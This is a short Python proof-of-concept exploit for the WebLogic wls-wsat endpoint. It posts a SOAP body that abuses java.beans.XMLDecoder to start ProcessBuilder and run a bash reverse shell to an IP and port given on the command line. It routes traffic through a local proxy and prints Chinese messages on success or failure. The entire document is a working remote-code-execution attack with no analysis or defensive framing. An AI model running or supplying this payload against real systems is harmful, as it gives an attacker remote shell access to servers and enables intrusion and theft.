import requests
import argparse

if __name__ == '__main__':
    parse=argparse.ArgumentParser()
    parse.add_argument("url",type=str)
    parse.add_argument("-s","--shellIp",type=str,required=True)
    parse.add_argument("-p","--port",type=str,required=True)

    arguments=parse.parse_args()
    url=arguments.url
    shellIp=arguments.shellIp
    dPort=arguments.port

    req=requests.session()
    req.proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"} #python3.7以上代理格式修复
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Accept-Encoding":"gzip",
        "Connection":"close",
        "Content-Type":"text/xml",
        "Content-Length":"599"
    }

    payload="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header>" \
            "<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">" \
            "<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">" \
            "<void class=\"java.lang.ProcessBuilder\">" \
            "<array class=\"java.lang.String\" length=\"3\">" \
            "<void index=\"0\">" \
            "<string>/bin/bash</string>" \
            "</void><void index=\"1\">" \
            "<string>-c</string>" \
            "</void><void index=\"2\">" \
            "<string>bash -i &gt;&amp; /dev/tcp/"+shellIp+"/"+dPort+" 0&gt;&amp;1</string>" \
            "</void>" \
            "</array>" \
            "<void method=\"start\"/></void>" \
            "</java>" \
            "</work:WorkContext>" \
            "</soapenv:Header>" \
            "<soapenv:Body/>" \
            "</soapenv:Envelope>"



    resq=req.post(url+"/wls-wsat/CoordinatorPortType",headers=headers,data=payload)
    if resq.status_code == 500:
        print("poc发送成功")
        print("请查看shell客户端")
    else:
        print("poc发送失败")



